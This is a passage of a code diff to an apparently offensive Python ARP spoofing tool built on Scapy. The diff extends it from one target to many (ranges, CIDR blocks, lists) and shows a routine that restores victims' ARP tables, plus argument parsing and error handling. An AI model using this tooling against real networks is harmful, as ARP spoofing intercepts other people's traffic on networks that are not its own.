+                        op=2,
+                        pdst=ip,
+                        psrc=gateway,
+                        hwsrc=gateway_mac,
+                    ),
+                    iface=iface,
+                    verbose=0,
+                )
+
+                if not semi:
+                    logger_debug(
+                        f"Restore {ip!r} for {gateway!r} ({count}/6)..."
+                    )
+                    sendp(
+                        Ether(src=mac, dst=gateway_mac)
+                        / ARP(
+                            op=2,
+                            pdst=gateway,
+                            psrc=ip,
+                            hwsrc=mac,
+                        ),
+                        iface=iface,
+                        verbose=0,
+                    )
+
+            sleep(0.5)
 
 
 def parse_args() -> Namespace:
@@ -423,7 +542,13 @@ def parse_args() -> Namespace:
     parser = ScapyArguments()
     add_argument = parser.add_argument
     add_argument("gateway", help="Gateway IP or hostname")
-    add_argument("target", help="Target IP or hostname")
+    add_argument(
+        "targets",
+        help=(
+            "Targets IP addresses (examples: 127.0.0.1 127.0.0.1/29 "
+            "127.0.0.1-127.0.0.9 127.0.0.1,127.0.0.2)"
+        ),
+    )
     add_argument(
         "--verbose",
         "-v",
@@ -472,7 +597,7 @@ def main() -> int:
 
     spoofer = SpooferARP(
         arguments.gateway,
-        arguments.target,
+        arguments.targets,
         iface,
         arguments.semi,
         arguments.time,
@@ -490,6 +615,9 @@ def main() -> int:
         sniffer = getattr(spoofer, "sniffer", None)
         if sniffer:
             sniffer.stop()
+    except Exception as e:
+        from traceback import print_exc
+        print_exc()
     finally:
         logger_warning("End of ARP spoofing. Restore ARP table...")
         spoofer.restore()
@@ -499,7 +627,7 @@ def main() -> int:
     return 1
 
 
-logger: Logger = get_custom_logger()
+logger: Logger = get_custom_logger(__name__)
 logger_debug: Callable = logger.debug
 logger_info: Callable = logger.info
 logger_warning: Callable = logger.warning
